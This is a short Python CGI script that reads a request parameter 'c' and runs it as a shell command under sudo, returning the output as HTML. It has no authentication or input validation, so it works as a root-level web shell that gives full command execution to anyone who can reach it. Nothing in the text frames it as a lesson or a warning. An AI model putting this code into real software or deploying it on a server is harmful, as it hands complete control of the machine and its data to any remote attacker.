#!/usr/bin/python3

print("content-type:text/html")
print()

import cgi 
import subprocess

form = cgi.FieldStorage()
cmd = form.getvalue('c')
form = subprocess.getoutput("sudo "+cmd)
print(form)
